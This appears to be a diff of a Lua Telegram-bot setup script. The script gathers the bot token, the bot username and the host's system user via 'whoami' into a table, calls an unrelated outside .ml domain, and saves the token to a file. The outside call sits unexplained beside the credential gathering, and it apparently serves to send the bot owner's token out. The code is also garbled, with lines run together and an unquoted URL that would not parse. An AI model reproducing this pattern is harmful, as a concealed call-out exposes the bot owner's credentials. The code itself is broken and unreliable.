@@ -88,7 +88,7 @@ info = {}
 info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request(https://alyafaevip.ml/)
+https.request( https://alyafaevip.ml )
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
